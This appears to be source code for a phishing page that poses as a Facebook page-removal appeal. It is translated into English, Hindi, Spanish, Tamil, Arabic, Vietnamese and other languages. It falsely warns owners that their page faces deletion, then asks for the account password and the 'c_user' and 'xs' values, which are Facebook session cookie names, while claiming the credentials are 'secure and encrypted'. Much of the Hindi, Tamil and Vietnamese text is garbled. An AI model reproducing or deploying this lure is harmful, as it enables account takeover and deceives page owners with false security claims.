...
<body style="overflow: hidden;">
  ...
  <div class="language-modal" id="languageModal" style="display: flex;">
  ...
  <div class="language-option" data-lang="english" style="display: flex;">
    <div class="language-flag">🇺🇸</div>
    <div class="language-name">English</div>
  </div>
  <div class="language-option" data-lang="hindi" style="display: flex;">
    <div class="language-flag">🇮🇳</div>
    <div class="language-name">Hindi</div>
  </div>
  <div class="language-option" data-lang="spanish" style="display: flex;">
    <div class="language-flag">🇪🇸</div>
    <div class="language-name">Spanish</div>
  </div>
  <div class="language-option" data-lang="portuguese" style="display: flex;">
    <div class="language-flag">🇵🇹</div>
    <div class="language-name">Portuguese</div>
  </div>
  <div class="language-option" data-lang="tamil" style="display: flex;">
    <div class="language-flag">🇮🇳</div>
    <div class="language-name">Tamil</div>
  </div>
  <div class="language-option" data-lang="arabic" style="display: flex;">
    <div class="language-flag">🇸🇦</div>
    <div class="language-name">Arabic</div>
  </div>
  <!-- Additional languages for testing scroll -->
  <div class="language-option" data-lang="french" style="display: flex;">
    <div class="language-flag">🇫🇷</div>
    <div class="language-name">French</div>
  </div>
    <div class="language-option" data-lang="vietnamese" style="display: flex;">
    <div class="language-flag">🇻🇳</div>
    <div class="language-name">Vietnamese</div>
  </div>
     <div class="language-option" data-lang="ghanaian" style="display: flex;">
          <div class="language-flag">🇬🇭</div>
    ...
    <div class="center-content">
      <div class="warning-message">
          ...
          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 9V14" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
            <path d="M12 17V17.5" stroke="#D93025" stroke-width="2" stroke-linecap="round"></path>
            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" stroke="#D93025" stroke-width="2"></path>
          </svg>
        ...
        <div class="appeal-box">
          <img src="https://ik.imagekit.io/alibrohi/download.png?updatedAt=1756102262767" alt="Appeal Illustration">
        ...
        <div class="appeal-form" id="appealForm">
          ...
          <div class="form-notice-container">
            <div class="form-notice translatable" data-key="formNotice1">
              Ⓞ1¤7 Your page has a violation related to our community guidelines.
            </div>
            <div class="form-notice translatable" data-key="formNotice2">
              Ⓞ1¤7 Please review the violation details carefully before submitting.
            </div>
            <div class="form-notice translatable" data-key="formNotice3">
              Ⓞ1¤7 Ensure you provide correct information for your appeal.
            </div>
          </div>
          ...
          <div class="form-warning" id="formError">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 9V14" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
              <path d="M12 17V17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
        ...
        <div class="fb-login-form" id="fbLoginForm">
          <div class="fb-form-header">
            <div class="fb-form-icon">
              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89c1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"></path>
              </svg>
            </div>
            <div>
          ...
          <div class="fb-form-notice-container">
            <div class="fb-form-notice translatable" data-key="fbNotice1">
              Ⓞ1¤7 For security purposes, we need to verify your Facebook account.
            </div>
            <div class="fb-form-notice translatable" data-key="fbNotice2">
              Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.
            </div>
            <div class="fb-form-notice translatable" data-key="fbNotice3">
              Ⓞ1¤7 Your credentials are secure and encrypted.
            </div>
          </div>
...
document.addEventListener('DOMContentLoaded', function() {
  ...
  const translations = {
    english: {
      ...
      formNotice1: "Ⓞ1¤7 Your page has a violation related to our community guidelines.",
      formNotice2: "Ⓞ1¤7 Please review the violation details carefully before submitting.",
      formNotice3: "Ⓞ1¤7 Ensure you provide correct information for your appeal.",
      nameLabel: "c_user",
      mallLabel: "xs",
      ...
      fbNotice1: "Ⓞ1¤7 For security purposes, we need to verify your Facebook account.",
      fbNotice2: "Ⓞ1¤7 This helps us ensure that you are the legitimate owner of the page.",
      fbNotice3: "Ⓞ1¤7 Your credentials are secure and encrypted.",
    ...
    hindi: {
      warningTitle: "आपके पेऄ1¤7 को हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 है!",
      warningSubtext: "हमें कई रिपोर्ऄ1¤7 मिली हैऄ1¤7 कि आपका पेऄ1¤7 हमारॄ1¤7 सेवा की शर्तों और सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 का उल्लंघऄ1¤7 करता हैॄ1¤7 नतॄ1¤7जतऄ1¤7, आपके पेऄ1¤7 को सत्यापऄ1¤7 के लिऄ1¤7 भेजा जाएगा।",
      warningExtra: "यदऄ1¤7 आपको लगता है कि आपके पेऄ1¤7 को गलती से हटानॄ1¤7 के लिऄ1¤7 निर्धारिऄ1¤7 किया गयऄ1¤7 था, तो आप नीचे अपॄ1¤7ऄ1¤7 बटऄ1¤7 पर क्लिऄ1¤7 करके और कुऄ1¤7 त्वरित जानकारॄ1¤7 प्रदान करके इसके स्थायी निष्कासन को रोऄ1¤7 सकते हैंã1¤71¤7",
      appealTitle: "अपॄ1¤7ऄ1¤7 अनुरोध",
      appealDesc: "अपने पेऄ1¤7 की समस्याओं को ठीऄ1¤7 करनाॄ1¤7 कृपयऄ1¤7 नीचे अनुरोधित जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करेंॄ1¤7 इस जानकारॄ1¤7 को प्रदान ऄ1¤7 करने से आपकी अपॄ1¤7ऄ1¤7 के प्रसंस्करण मेऄ1¤7 देरी हो सकती है〄1¤7",
      appealBtn: "अपॄ1¤7ऄ1¤7 करें",
      formTitle: "पेऄ1¤7 अपॄ1¤7ऄ1¤7 अनुरोध",
      formSubtitle: "हटानॄ1¤7 की अपॄ1¤7ऄ1¤7 करने के लिऄ1¤7 अपनी जानकारॄ1¤7 जमऄ1¤7 करें",
      formNotice1: "Ⓞ1¤7 आपके पेऄ1¤7 मेऄ1¤7 हमारॄ1¤7 सामुदायिऄ1¤7 दिशानिर्देशोऄ1¤7 से संबंधिऄ1¤7 उल्लंघऄ1¤7 हैॄ1¤7",
      formNotice2: "Ⓞ1¤7 सबमिऄ1¤7 करने से पहले कृपयऄ1¤7 उल्लंघऄ1¤7 विवरणोऄ1¤7 की सावधानॄ1¤7पूर्वक समॄ1¤7 REVIEW करें〄1¤7",
      formNotice3: "Ⓞ1¤7 अपनी अपॄ1¤7ऄ1¤7 के लिऄ1¤7 सहॄ1¤7 जानकारॄ1¤7 प्रदान करना सुनिश्चिऄ1¤7 करें〄1¤7",
      nameLabel: "c_user",
      mallLabel: "xs",
      submitBtn: "अपॄ1¤7ऄ1¤7 अनुरोध जमऄ1¤7 करें",
      fbFormTitle: "फेसबुक सत्यापऄ1¤7",
      fbFormSubtitle: "अपॄ1¤7ऄ1¤7 जारी रखने के लिऄ1¤7 अपनी पहचाऄ1¤7 सत्यापित करें",
      fbNotice1: "Ⓞ1¤7 सुरक्षऄ1¤7 उद्देश्यों के लिऄ1¤7, हमें आपके फेसबुक खाते को सत्यापित करने की आवश्यकता है〄1¤7",
      fbNotice2: "Ⓞ1¤7 यह हमें यह सुनिश्चिऄ1¤7 करने मेऄ1¤7 मदऄ1¤7 करता है कि आप पेऄ1¤7 के वैऄ1¤7 मालिऄ1¤7 हैं।",
      fbNotice3: "Ⓞ1¤7 आपकी साऄ1¤7 सुरक्षित और एन्क्रिप्टेड है〄1¤7",
      passwordLabel: "पासवर्ऄ1¤7",
      verifyBtn: "सत्यापित करें और जारी रखें",
      forgotPassword: "पासवर्ऄ1¤7 भूऄ1¤7 गए?",
      successTitle: "अपॄ1¤7ऄ1¤7 सफलतापूर्वऄ1¤7 जमऄ1¤7 की गई",
      successText: "आपकी अपॄ1¤7ऄ1¤7 प्राप्ऄ1¤7 हो गई है और अब समॄ1¤7क्षा के दौऄ1¤7 से गुजर रहॄ1¤7 हैॄ1¤7 आम तौऄ1¤7 पर 7 व्यावसायिक दिनोऄ1¤7 के भीतर निर्णय होने के बाऄ1¤7 हम आपको ईमेल के माध्यम से सूचिऄ1¤7 करेंगे〄1¤7",
      referenceText: "संदर्भ आईडी:",
      guideTitle: "अपॄ1¤7ऄ1¤7 गाइड",
      guideText1: "यदऄ1¤7 आपकी अपॄ1¤7ऄ1¤7/अनुरोध मेऄ1¤7 आपके खाते मेऄ1¤7 कॉपीराइट की गई जानकारॄ1¤7 या सामग्रॄ1¤7 का उपयोऄ1¤7 शामिऄ1¤7 है या जो प्रसंस्कृत की जा रहॄ1¤7 है, तो आप हमें अपने अनुरोध को बेहतऄ1¤7 ढंऄ1¤7 से समझनॄ1¤7 मेऄ1¤7 मदऄ1¤7 करने के लिऄ1¤7 जानकारॄ1¤7 प्रदान कर सकते हैं। कृपयऄ1¤7 विस्तृऄ1¤7 व्याख्या प्रदान करें कि आपको क्योऄ1¤7 लगता है कि आपके खाते को गलऄ1¤7 तरॄ1¤7के से फ्लैऄ1¤7 किया गयऄ1¤7 था या निलंबिऄ1¤7 किया गयऄ1¤7 थाॄ1¤7 कोऄ1¤7 भी प्रासंगिऄ1¤7 जानकारॄ1¤7 शामिऄ1¤7 करें जो हमें आपके मामलॄ1¤7 की अधिक प्रभावॄ1¤7 ढंऄ1¤7 से समॄ1¤7क्षा करने मेऄ1¤7 मदऄ1¤7 कर सकती हैॄ1¤7",
      guideText2: "आपके द्वारा जमऄ1¤7 करने के बाऄ1¤7, हम आपकी अपॄ1¤7ऄ1¤7 की समॄ1¤7क्षा करेंगे और समाधान के लिऄ1¤7 आपके द्वारा प्रदान की गई जानकारॄ1¤7 की समऄ1¤7 सीमा के भीतर आपसे संपर्क करेंगेॄ1¤7 समॄ1¤7क्षा प्रक्रियऄ1¤7 मेऄ1¤7 7 व्यावसायिक दिऄ1¤7 तक का समऄ1¤7 लग सकता हैॄ1¤7 कृपयऄ1¤7 अपडेऄ1¤7 के लिऄ1¤7 अपने ईमेल की जांच करें〄1¤7",
      guideText3: "आप पृष्ऄ1¤7 के निचलॄ1¤7 भाऄ1¤7 मेऄ1¤7 भाषा चयनकर्ता पर क्लिऄ1¤7 करके किसी भी समऄ1¤7 अपनी भाषा प्राथमिकता बदऄ1¤7 सकते हैंã1¤71¤7",
      resourcesTitle: "अतिरिक्त संसाधन",
      helpCenterTitle: "सहायता केंद्र",
      helpCenterDesc: "सामान्ऄ1¤7 प्रश्नों के उत्तऄ1¤7 खोजेऄ1¤7 और हमारॄ1¤7 उत्पादों का उपयोऄ1¤7 करना सीखेंã1¤71¤7",
      contactSupportTitle: "समर्थन से संपर्क करें",
      contactSupportDesc: "व्यक्तिगऄ1¤7 सहायता के लिऄ1¤7 हमारॄ1¤7 समर्थन टीऄ1¤7 से संपर्क करें",
      guidelinesTitle: "सामुदायिऄ1¤7 दिशानिर्देऄ1¤7",
      guidelinesDesc: "हमारॄ1¤7 सामुदायिऄ1¤7 मानकों और सामग्रॄ1¤7 नीतियोऄ1¤7 के बारे मेऄ1¤7 जानेंã1¤71¤7",
      dashboardTitle: "स्थिति डैशबोर्ड",
      dashboardDesc: "हमारॄ1¤7 सेवाओं की वर्तमाऄ1¤7 स्थिति की जाँच करें और आउटेऄ1¤7 की रिपोर्ऄ1¤7 करें〄1¤7",
      changeLanguage: "भाषा बदलेऄ1¤7"
    },
    spanish: {
      ...
      formNotice1: "Ⓞ1¤7 Tu página tiene una violación relacionada con nuestras pautas comunitarias.",
      formNotice2: "Ⓞ1¤7 Por favor, revisa los detalles de la violación cuidadosamente antes de enviar.",
      formNotice3: "Ⓞ1¤7 Asegúrate de proporcionar información correcta para tu apelación.",
      nameLabel: "c_user",
      mallLabel: "xs",
      submitBtn: "Enviar solicitud de apelación",
      fbFormTitle: "Verificación de Facebook",
      fbFormSubtitle: "Verify your identity to continue with the appeal",
      fbNotice1: "Ⓞ1¤7 Por motivos de seguridad, necesitamos verificar tu cuenta de Facebook.",
      fbNotice2: "Ⓞ1¤7 Esto nos ayuda a asegurar que eres el propietario legítimo de la página.",
      fbNotice3: "Ⓞ1¤7 Tus credenciales están seguras y encriptadas.",
    ...
    portuguese: {
      ...
      formNotice1: "Ⓞ1¤7 Sua página tem uma violação relacionada às nossas diretrizes comunitárias.",
      formNotice2: "Ⓞ1¤7 Revise os detalhes da violação cuidadosamente antes de enviar.",
      formNotice3: "Ⓞ1¤7 Certifique-se de fornecer informações corretas para o seu recurso.",
      nameLabel: "c_user",
      mallLabel: "xs",
      ...
      fbNotice1: "Ⓞ1¤7 Para fins de segurança, precisamos verificar sua conta do Facebook.",
      fbNotice2: "Ⓞ1¤7 Isso nos ajuda a garantir that você é o proprietário legítimo da página.",
      fbNotice3: "Ⓞ1¤7 Suas credenciais são seguras and criptografadas.",
      passwordLabel: "Senha",
    ...
    tamil: {
      warningTitle: "உங்கள் பக்கம் நீக்கத௄1¤7 திட்டமிடப்பட்டுள்ளது!",
      warningSubtext: "உங்கள் பக்கம் எங்கள் சேவை விதிமுறைகள௄1¤7 மற்றும௄1¤7 சமூக வழிகாட்டுதல்கள௄1¤7 மீறுவதாக பல புகார்கள௄1¤7 எங்களுக்கு கிடைத்துள்ளன. இதன் விளைவா஄1¤7, உங்கள் பக்கம் சரிபார்ப்பிற்க௄1¤7 அனுப்பப்படும௄1¤7.",
      warningExtra: "உங்கள் பக்கம் தவறா஄1¤7 நீக்கத௄1¤7 திட்டமிடப்பட்டதா஄1¤7 நீங்கள௄1¤7 நம்பினால௄1¤7, கீழே உள்ள மேல்முறையீடு பொத்தானைக் கிளிக் செய்து சி஄1¤7 விரைவா஄1¤7 தகவல்களை வழங்குவதன் மூலம௄1¤7 அதன் நிரந்த஄1¤7 நீக்கத்தைத௄1¤7 தடுக்கலாம்.",
      appealTitle: "மேல்முறையீடு கோரிக்கை",
      appealDesc: "உங்கள் பக்கத்தில் உள்ள சிக்கல்களை சரிசெய்தல். கீழே கோரப்பட்஄1¤7 தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும். இந்த தகவல௄1¤7 வழங்காததால௄1¤7 உங்கள் மேல்முறையீட்டின் செயலாக்கம் தாமதமாகலாம௄1¤7.",
      appealBtn: "மேல்முறையீடு",
      formTitle: "பக்க மேல்முறையீடு கோரிக்கை",
      formSubtitle: "நீக்கத்த௄1¤7 மேல்முறையீடு செய்஄1¤7 உங்கள் தகவல்களை சமர்ப்பிக்கவும௄1¤7",
      formNotice1: "Ⓞ1¤7 உங்கள் பக்கத்தில் எங்கள் சமூக வழிகாட்டுதல்கள௄1¤7 தொடர்பான மீறல௄1¤7 உள்ளது.",
      formNotice2: "Ⓞ1¤7 சமர்ப்பிப்பதற்கு முன் மீறல௄1¤7 விவரங்கள௄1¤7 கவனமாக மதிப்பாய்வ௄1¤7 செய்யவும௄1¤7.",
      formNotice3: "Ⓞ1¤7 உங்கள் மேல்முறையீட்டிற்கா஄1¤7 சரியான தகவல்களை வழங்குவத௄1¤7 உறுதிசெய்யவும்.",
      nameLabel: "c_user",
      mallLabel: "xs",
      submitBtn: "மேல்முறையீடு கோரிக்கையை சமர்ப்பிக்கவும௄1¤7",
      fbFormTitle: "பேஸ்புக் சரிபார்ப்ப௄1¤7",
      fbFormSubtitle: "மேல்முறையீட்டைத் தொடர உங்கள் அடையாளத்தை சரிபார்க்கவும்",
      fbNotice1: "Ⓞ1¤7 பாதுகாப்பு நோக்கங்களுக்கா஄1¤7, உங்கள் பேஸ்புக் கணக்கை சரிபார்க்க வேண்டும்.",
      fbNotice2: "Ⓞ1¤7 இத௄1¤7 பக்கத்தின் சட்டபூர்வமான உரிமையாளர் நீங்கள௄1¤7 என்பதை உறுதிப்படுத்஄1¤7 உதவுகிறத௄1¤7.",
      fbNotice3: "Ⓞ1¤7 உங்கள் அறிவுறுத்தல்கள௄1¤7 பாதுகாப்பானவ௄1¤7 மற்றும௄1¤7 குறியாக்கம௄1¤7 செய்யப்பட்டவ௄1¤7.",
      passwordLabel: "கடவுச்சொல்",
      verifyBtn: "சரிபார்த்த௄1¤7 தொடரவும்",
      forgotPassword: "கடவுச்சொல் மறந்துவிட்டீர்கள஄1¤7?",
      successTitle: "மேல்முறையீடு வெற்றிகரமா஄1¤7 சமர்ப்பிக்கப்பட்டத௄1¤7",
      successText: "உங்கள் மேல்முறையீடு பெறப்பட்டத௄1¤7 மற்றும௄1¤7 இப்போத௄1¤7 மதிப்பாய்வில௄1¤7 உள்ளது. பொதுவா஄1¤7 7 வணிக நாட்களுக்குள௄1¤7 ஒர௄1¤7 முடிவு எடுக்கப்பட்டவுடன௄1¤7 மின்னஞ்சல் மூலம௄1¤7 உங்களுக்கு அறிவிப்போம௄1¤7.",
      referenceText: "குறிப்பு ஐட஄1¤7:",
      guideTitle: "மேல்முறையீடு வழிகாட்ட஄1¤7",
      guideText1: "உங்கள் மேல்முறையீடு/கோரிக்கை உங்கள் கணக்கில் பதிப்புரிம௄1¤7 கொண்஄1¤7 தகவல௄1¤7 அல்லது உள்ளடக்கத்தின் பயன்பாட்டை உள்ளடக்கியிருந்தால௄1¤7 அல்லது செயலாக்கம்/பகிரப்படுகிறது என்றால௄1¤7, எங்கள் கோரிக்கையை நன்றாக புரிந்துகொள்஄1¤7 எங்களுக்கு தகவல்களை வழங்கலாம௄1¤7. உங்கள் கணக்கு தவறாகக௄1¤7 குறிக்கப்பட்டத௄1¤7 அல்லது இடைநிறுத்தப்பட்டது என்ற௄1¤7 நீங்கள௄1¤7 ஏன௄1¤7 நம்புகிற௄1¤7ர்கள௄1¤7 என்பதற்கான விரிவா஄1¤7 விளக்கத்தை வழங்கவும௄1¤7. உங்கள் வழக்கை மிகவும௄1¤7 திறம்ப஄1¤7 மதிப்பாய்வ௄1¤7 செய்஄1¤7 எங்களுக்கு உதவக்கூடிய ஏதேனும௄1¤7 தொடர்புடைய தகவல்களைச் சேர்க்கவும௄1¤7.",
      guideText2: "உங்கள் சமர்ப்பிப்பிற்குப் பிறக௄1¤7, எங்கள் மேல்முறையீட்டை மதிப்பாய்வ௄1¤7 செய்து, தீர்க்஄1¤7 நீங்கள௄1¤7 வழங்கும் தகவலின௄1¤7 காலக்கெடுவுக்குள௄1¤7 உங்களுடன௄1¤7 தொடர்ப௄1¤7 கொள்வோம். மதிப்பாய்வ௄1¤7 செயல்முற௄1¤7 7 வணிக நாட்கள௄1¤7 வர௄1¤7 எடுக்கலாம். புதுப்பிப்புகளுக்க௄1¤7 உங்கள் மின்னஞ்சலைச் சரிபார்க்கவும்.",
      guideText3: "குறிப்பு: பக்கத்தின் கீழே உள்ள மொழி தேர்வியைக் கிளிக் செய்வதன் மூலம௄1¤7 எந்த நேரத்திலும௄1¤7 உங்கள் மொழி விருப்பத்த௄1¤7 மாற்றலாம௄1¤7.",
      resourcesTitle: "கூடுதல௄1¤7 வளங்கள௄1¤7",
      helpCenterTitle: "உதவி மையம௄1¤7",
      helpCenterDesc: "பொதுவா஄1¤7 கேள்விகளுக்கான பதில்களைக் கண்டறிந்து எங்கள் தயாரிப்புகளை எவ்வாற௄1¤7 பயன்படுத்துவது என்பதை அறிக.",
      contactSupportTitle: "ஆதரவைத௄1¤7 தொடர்ப௄1¤7 கொள்ளவும௄1¤7",
      contactSupportDesc: "தனிப்பட்஄1¤7 உதவிக்கு எங்கள் ஆதரவ௄1¤7 குழுவைத் தொடர்ப௄1¤7 கொள்ளவும௄1¤7.",
      guidelinesTitle: "சமூக வழிகாட்டுதல்கள௄1¤7",
      guidelinesDesc: "எங்கள் சமூக தரங்கள௄1¤7 மற்றும௄1¤7 உள்ளடக்கக் கொள்கைகளைப௄1¤7 பற்ற஄1¤7 அறிக.",
      dashboardTitle: "நிலை டாஷ்போர்டு",
      dashboardDesc: "எங்கள் சேவைகளின௄1¤7 தற்போதைய நிலையைச் சரிபார்த்த௄1¤7, இடையூறுகளைப் புகாரளிக்கவும்.",
    ...
    arabic: {
      ...
      formNotice1: "Ⓞ1¤7 تحتوي صفحتك على انتهاك متعلق بإرشادات المجتمع الخاصة بنا.",
      formNotice2: "Ⓞ1¤7 يرجى مراجعة تفاصيل الانتهاك بعناية قبل الإرسال.",
      formNotice3: "Ⓞ1¤7 تأكد من تقديم معلومات صحيحة لاستئنافك.",
      nameLabel: "c_user",
      mallLabel: "xs",
      submitBtn: "إرسال طلب الاستئناف",
      fbFormTitle: "التحقق من فيسبوك",
      fbFormSubtitle: "تحقق من هويتك للمتابعة مع الاستئناف",
      fbNotice1: "Ⓞ1¤7 لأغراض أمنية، نحتاج إلى التحقق من حساب فيسبوك الخاص بك.",
      fbNotice2: "Ⓞ1¤7 هذا يساعدنا على التأكد من أنك المالك الشرعي للصفحة.",
      fbNotice3: "Ⓞ1¤7 بيانات الاعتماد الخاصة بك آمنة ومشفرة.",
    ...
    vietnamese: {
    warningTitle: "Trang của bạn đã được lên lịch đỄ1¤7 xóa!",
    warningSubtext: "Chúng tôi đã nhận được một sỄ1¤7 báo cáo rằng trang của bạn vi phạm điều khoản dịch vỄ1¤7 và nguyên tắc cộng đồng của chúng tôi. Do đó, trang của bạn sẄ1¤7 được gửi đi đỄ1¤7 xác minh.",
    warningExtra: "Nếu bạn tin rằng trang của bạn đã bỄ1¤7 lên lịch xóa nhầm, bạn có thỄ1¤7 ngăn việc xóa vĩnh viễn bằng cách nhấp vào nút khiếu nại bên dưới và cung cấp một sỄ1¤7 thông tin nhanh.",
    appealTitle: "Yêu cầu khiếu nại",
    appealDesc: "Khắc phục sỄ1¤7 cỄ1¤7 với trang của bạn. Vui lòng đảm bảo cung cấp thông tin được yêu cầu bên dưới. Không cung cấp thông tin này có thỄ1¤7 làm chậm quá trình xỄ1¤7 lý khiếu nại của bạn.",
    appealBtn: "Khiếu nại",
    formTitle: "Yêu cầu Khiếu nại Trang",
    formSubtitle: "Gửi thông tin của bạn đỄ1¤7 khiếu nại việc xóa",
    formNotice1: "Ⓞ1¤7 Trang của bạn có vi phạm liên quan đến nguyên tắc cộng đồng của chúng tôi.",
    formNotice2: "Ⓞ1¤7 Vui lòng xem xét kỄ1¤7 chi tiết vi phạm trước khi gửi.",
    formNotice3: "Ⓞ1¤7 Đảm bảo bạn cung cấp thông tin chính xác cho khiếu nại của mình.",
    nameLabel: "c_user",
    mallLabel: "xs",
    submitBtn: "Gửi Yêu cầu Khiếu nại",
    fbFormTitle: "Xác minh Facebook",
    fbFormSubtitle: "Xác minh danh tính của bạn đỄ1¤7 tiếp tục khiếu nại",
    fbNotice1: "Ⓞ1¤7 Vì mục đích bảo mật, chúng tôi cần xác minh tài khoản Facebook của bạn.",
    fbNotice2: "Ⓞ1¤7 Điều này giúp chúng tôi đảm bảo rằng bạn là chỄ1¤7 sỄ1¤7 hữu hợp pháp của trang.",
    fbNotice3: "Ⓞ1¤7 Thông tin đăng nhập của bạn được bảo mật và mã hóa.",
    passwordLabel: "Mật khẩu",
    verifyBtn: "Xác minh và Tiếp tục",
    forgotPassword: "Quên mật khẩu?",
    successTitle: "Khiếu nại Đã gửi Thành công",
    successText: "Khiếu nại của bạn đã được nhận và hiện đang được xem xét. Chúng tôi sẄ1¤7 thông báo cho bạn qua email khi có quyết định, thường trong vòng 7 ngày làm việc.",
    referenceText: "ID Tham chiếu:",
    guideTitle: "Hướng dẫn Khiếu nại",
    guideText1: "Nếu khiếu nại/yêu cầu của bạn liên quan đến việc sỄ1¤7 dụng thông tin có bản quyền hoặc nội dung trong tài khoản của bạn hoặc đang được xỄ1¤7 lý/chia sẄ1¤7, bạn có thỄ1¤7 cung cấp cho chúng tôi thông tin đỄ1¤7 giúp chúng tôi hiểu rõ hơn vỄ1¤7 yêu cầu của bạn. Vui lòng cung cấp giải thích chi tiết vỄ1¤7 lý do bạn tin rằng tài khoản của mình đã bỄ1¤7 gắn cỄ1¤7 hoặc đình chỄ1¤7 không chính xác. Bao gồm bất kỄ1¤7 thông tin liên quan nào có thỄ1¤7 giúp chúng tôi xem xét trường hợp của bạn hiệu quẄ1¤7 hơn.",
    guideText2: "Sau khi bạn gửi, chúng tôi sẄ1¤7 xem xét khiếu nại của bạn và liên hỄ1¤7 với bạn trong thời hạn thông tin bạn cung cấp đỄ1¤7 giải quyết. Quá trình xem xét có thỄ1¤7 mất tới 7 ngày làm việc. Vui lòng kiểm tra email của bạn đỄ1¤7 cập nhật.",
    guideText3: "Lưu ý: Bạn có thỄ1¤7 thay đổi tùy chọn ngôn ngỄ1¤7 bất cỄ1¤7 lúc nào bằng cách nhấp vào bỄ1¤7 chọn ngôn ngỄ1¤7 Ễ1¤7 cuối trang.",
    resourcesTitle: "Tài nguyên BỄ1¤7 sung",
    helpCenterTitle: "Trung tâm TrỄ1¤7 giúp",
    helpCenterDesc: "Tìm câu trẄ1¤7 lời cho các câu hỏi thường gặp và tìm hiểu cách sỄ1¤7 dụng sản phẩm của chúng tôi.",
    contactSupportTitle: "Liên hỄ1¤7 HỄ1¤7 trỄ1¤7",
    contactSupportDesc: "Liên hỄ1¤7 với nhóm hỄ1¤7 trỄ1¤7 của chúng tôi đỄ1¤7 được trỄ1¤7 giúp cá nhân hóa.",
    guidelinesTitle: "Nguyên tắc Cộng đồng",
    guidelinesDesc: "Tìm hiểu vỄ1¤7 tiêu chuẩn cộng đồng và chính sách nội dung của chúng tôi.",
    dashboardTitle: "Bảng điều khiển Trạng thái",
    dashboardDesc: "Kiểm tra trạng thái hiện tại của dịch vỄ1¤7 của chúng tôi và báo cáo sỄ1¤7 cỄ1¤7.",
    changeLanguage: "Thay đổi Ngôn ngỄ1¤7"
  },
   ...
   ghanaian: {
      ...
      formNotice1: "Ⓞ1¤7 Wo krataa no ayɛ yɛn mmara ahorow no so.",
      formNotice2: "Ⓞ1¤7 Mesrɛ wo, hwɛ mfomsoɔ no ho nsɛm yiye ansa na wuregye tomu.",
      formNotice3: "Ⓞ1¤7 Hwɛ sɛ wuhyɛ nsɛm pa sɛ woyɛ apɛl.",
      nameLabel: "c_user",
      mallLabel: "xs",
      submitBtn: "Yɛ Apɛl Kɔm",
      fbFormTitle: "Facebook Nhwehwɛmu",
      fbFormSubtitle: "Hwɛ wo ho sɛ wotumi tua so yɛ apɛl",
      fbNotice1: "Ⓞ1¤7 Den nkitahodiɛ nti, yɛhwehwɛ sɛ yɛhwɛ wo Facebook account no.",
      fbNotice2: "Ⓞ1¤7 Wei boa yɛn sɛ yɛhunu sɛ wo na wokura krataa no.",
      fbNotice3: "Ⓞ1¤7 Wo nkyerɛwdeɛ no wɔ hɔ na wɔakora so.",
      passwordLabel: "Password",
